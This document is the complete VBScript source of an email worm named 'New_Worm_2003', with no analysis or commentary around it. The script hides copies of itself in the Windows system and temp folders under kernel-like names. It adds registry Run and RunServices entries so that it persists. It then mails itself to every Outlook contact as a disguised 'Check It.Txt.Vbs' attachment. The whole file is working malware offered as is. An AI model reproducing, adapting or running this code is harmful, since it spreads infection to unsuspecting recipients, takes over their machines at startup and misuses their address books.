   'Script_Name:New_Worm_2003
   'Code By:None
   'Rem:New_Worm_2003
   'Design Date:None
   Dim Fso,Wsh,Wol,Script,Winsys,Wintmp,NewFile,OldFile,TextBody
   Call Main
   Sub Main()
     Msgbox "None"
     Call Init
     Call Mail_Worm
   End Sub
   Sub Init()
     On Error Resume Next
     Set Fso=CreateObject("Scripting.FileSystemObject")
     Set Wsh=CreateObject("Wscript.Shell")
     Set Script=Fso.GetFile(Wscript.ScriptFullName)
     Winsys=Fso.GetSpecialFolder(1)
     Wintmp=Fso.GetSpecialFolder(2)
     Script.Copy Winsys & "\Kernel.Vbs",True
     Script.Copy Wintmp & "\Kernel32.Vbs",True
     Fso.GetFile(Winsys & "\Kernel.Vbs").Attributes=2
     Wsh.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Kernel",Winsys & "\Kernel.Vbs"
     Wsh.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Kernel",Winsys & "\Kernel.Vbs"
   End Sub
   Sub Mail_Worm()
     On Error Resume Next
     Set Wol=CreateObject("Outlook.Application")
     Set Mapi=Wol.GetNameSpace("MAPI")
     For ctrlists=1 To Mapi.AddressLists.Count
       Set A=Mapi.AddressLists(ctrlists)
       For Ctrentries=1 To A.AddressEntries.Count
         Set Mail=Wol.CreateItem(0)
         Mail.Recipients.Add (A.AddressEntries(Ctrentries))
         Mail.Subject="Hello!"
         Mail.Body="Check Attachment!"
         Script.Copy(Wintmp & "\Check It.Txt.Vbs")
         Mail.Attachments.Add (Wintmp & "\Check It.Txt.Vbs")
         Mail.Send
         Fso.DeleteFile Wintmp & "\Check It.Txt.Vbs"
         Set Mail=Nothing
       Next
       Set A=Nothing
     Next
     Set Mapi=Nothing
   End Sub
   Sub Sub_File(File)
     On Error Resume Next
     ExtName=Lcase(Fso.GetExtenSionName(File))
   End Sub
